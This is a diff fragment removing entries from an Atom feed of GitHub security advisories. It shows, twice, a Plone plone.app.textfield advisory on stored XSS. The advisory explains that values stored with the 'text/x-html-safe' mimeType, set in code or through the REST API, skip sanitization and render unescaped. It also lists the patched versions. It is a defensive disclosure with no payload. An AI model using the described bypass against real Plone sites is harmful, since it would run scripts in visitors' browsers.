-<p>A stored XSS affecting RichText fields. RichTextValue.output returns the raw, unsanitized stored value whenever the stored mimeType equals the outputMimeType. Because the safe-HTML output type (<code>text/x-html-safe</code>) is the type that signifies "already sanitized", any value whose stored mimeType equals it bypasses the safe_html transform entirely on render. The transform itself is sound — it correctly strips <code>on*</code> event-handler attributes and <code>javascript:/data:</code> URIs; the defect is that it is never invoked for these values. The unsanitized value is then emitted via <code>tal:content="structure ..."</code>, which performs no escaping, so the payload executes in the viewer's browser. </p>
-<p>This can be a problem when a RichText field is wrongly defined in code with a <code>mimeType</code> and <code>outputMimeType</code> that are the same, or when the REST API is used to the same effect.</p>
-<h3 id="patches">Patches</h3>
-<p>The problem has been patched:</p>
-<ul>
-<li>For Plone 6.0, upgrade <code>plone.app.textfield</code> to 2.0.2.</li>
-<li>For Plone 6.1, upgrade <code>plone.app.textfield</code> to 3.0.2.</li>
-<li>For Plone 6.2, upgrade <code>plone.app.textfield</code> to 4.0.1.</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no known workaround.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5">https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5</a></li>
-<li><a href="https://github.com/advisories/GHSA-4r4f-gg25-rmg5">https://github.com/advisories/GHSA-4r4f-gg25-rmg5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4r4f-gg25-rmg5</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-17T18:35:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[plone.app.textfield] plone.app.textfield: Stored XSS by spoofing mime type ]]></title>
-        <id>https://github.com/advisories/GHSA-4r4f-gg25-rmg5</id>
-        <link href="https://github.com/advisories/GHSA-4r4f-gg25-rmg5"/>
-        <updated>2026-07-17T18:36:00.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A stored XSS affecting RichText fields. RichTextValue.output returns the raw, unsanitized stored value whenever the stored mimeType equals the outputMimeType. Because the safe-HTML output type (<code>text/x-html-safe</code>) is the type that signifies "already sanitized", any value whose stored mimeType equals it bypasses the safe_html transform entirely on render. The transform itself is sound — it correctly strips <code>on*</code> event-handler attributes and <code>javascript:/data:</code> URIs; the defect is that it is never invoked for these values. The unsanitized value is then emitted via <code>tal:content="structure ..."</code>, which performs no escaping, so the payload executes in the viewer's browser. </p>
-<p>This can be a problem when a RichText field is wrongly defined in code with a <code>mimeType</code> and <code>outputMimeType</code> that are the same, or when the REST API is used to the same effect.</p>
-<h3 id="patches">Patches</h3>
-<p>The problem has been patched:</p>
-<ul>
-<li>For Plone 6.0, upgrade <code>plone.app.textfield</code> to 2.0.2.</li>
-<li>For Plone 6.1, upgrade <code>plone.app.textfield</code> to 3.0.2.</li>
-<li>For Plone 6.2, upgrade <code>plone.app.textfield</code> to 4.0.1.</li>
-</ul>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no known workaround.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5">https://github.com/plone/plone.app.textfield/security/advisories/GHSA-4r4f-gg25-rmg5</a></li>
-<li><a href="https://github.com/advisories/GHSA-4r4f-gg25-rmg5">https://github.com/advisories/GHSA-4r4f-gg25-rmg5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4r4f-gg25-rmg5</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-17T18:35:57.000Z</published>
     </entry>
 </feed>
